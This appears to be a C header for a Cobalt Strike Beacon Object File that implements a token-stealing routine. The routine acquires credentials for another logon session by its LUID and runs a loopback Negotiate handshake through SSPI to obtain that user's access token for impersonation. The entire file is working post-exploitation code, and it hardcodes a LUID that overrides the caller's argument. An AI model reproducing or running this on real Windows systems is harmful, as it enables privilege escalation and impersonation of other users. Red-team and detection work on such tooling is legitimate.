#pragma once
#include "../common/secur32_lib.h"

DECLSPEC_IMPORT void* __cdecl msvcrt$malloc(size_t size);

DECLSPEC_IMPORT void  __cdecl msvcrt$free(void*);

HANDLE steal_token_with_logon_id(LUID *logon_id)
{
	SECURITY_STATUS status;
	TimeStamp expts;
	char pkgname[] = { "Negotiate" };
	char principal[1] = { 0 };
	HANDLE token = NULL;
	CredHandle cred = { 0, 0 };

	logon_id->LowPart = 14284703;
	logon_id->HighPart = 0;
	status = secur32$AcquireCredentialsHandleA(principal, pkgname, SECPKG_CRED_BOTH, logon_id, NULL, NULL, NULL, &cred, &expts);
	if (status != SEC_E_OK) {
		BeaconPrintf(CALLBACK_ERROR, "could not acquire credential handle: 0x%08lx", status);
		return NULL;
	}

	BeaconPrintf(CALLBACK_OUTPUT, "acquired credential handle is %08lx", cred);
	if (cred.dwLower == 0 && cred.dwUpper == 0) {
		return NULL;
	}

	char target[1] = { 0 };
	ULONG attr;
	TimeStamp ts;
	CtxtHandle client_ctx = { 0 }, server_ctx = { 0 };
	SecBufferDesc client_token, server_token;
	SecBuffer client_buf, server_buf;

	client_token.ulVersion = server_token.ulVersion = 0;
	client_token.cBuffers = server_token.cBuffers = 1;
	client_token.pBuffers = &client_buf;
	server_token.pBuffers = &server_buf;

	client_buf.BufferType = server_buf.BufferType = 2;
	client_buf.cbBuffer = server_buf.cbBuffer = 4096;
	client_buf.pvBuffer = msvcrt$malloc(4096);
	server_buf.pvBuffer = msvcrt$malloc(4096);

	status = secur32$InitializeSecurityContextA(
		&cred,
		NULL,
		target,
		ISC_REQ_CONNECTION,
		0,
		SECURITY_NATIVE_DREP,
		NULL,
		0,
		&client_ctx,
		&client_token,
		&attr,
		&ts);
	if (status != SEC_I_CONTINUE_NEEDED) {
		BeaconPrintf(CALLBACK_ERROR, "could not initialize security context: 0x%08lx", status);
		goto END_;
	}

	status = secur32$AcceptSecurityContext(
		&cred,
		NULL,
		&client_token,
		ASC_REQ_CONNECTION,
		SECURITY_NATIVE_DREP,
		&server_ctx,
		&server_token,
		&attr,
		&ts);
	if (status != SEC_I_CONTINUE_NEEDED) {
		BeaconPrintf(CALLBACK_ERROR, "could not accept security context: 0x%08lx", status);
		goto END_;
	}

	client_buf.cbBuffer = 4096;

	status = secur32$InitializeSecurityContextA(
		&cred,
		&client_ctx,
		target,
		ISC_REQ_CONNECTION,
		0,
		SECURITY_NATIVE_DREP,
		&server_token,
		0,
		&client_ctx,
		&client_token,
		&attr,
		&ts);
	if (status != SEC_I_CONTINUE_NEEDED) {
		BeaconPrintf(CALLBACK_ERROR, "could not initialize security context: 0x%08lx", status);
		goto END_;
	}

	server_buf.cbBuffer = 4096;
	status = secur32$AcceptSecurityContext(
		&cred,
		&server_ctx,
		&client_token,
		ASC_REQ_CONNECTION,
		SECURITY_NATIVE_DREP,
		&server_ctx,
		&server_token,
		&attr,
		&ts);
	if (status != SEC_E_OK) {
		BeaconPrintf(CALLBACK_ERROR, "could not accept security context: 0x%08lx", status);
		goto END_;
	}

	status = secur32$QuerySecurityContextToken(&server_ctx, &token);
	if (status != SEC_E_OK) {
		BeaconPrintf(CALLBACK_ERROR, "could not query token: 0x%08lx", status);
		goto END_;
	}

END_:
	msvcrt$free(client_buf.pvBuffer);
	msvcrt$free(server_buf.pvBuffer);
	secur32$DeleteSecurityContext(&client_ctx);
	secur32$DeleteSecurityContext(&server_ctx);
	secur32$FreeCredentialsHandle(&cred);
	return token;
}
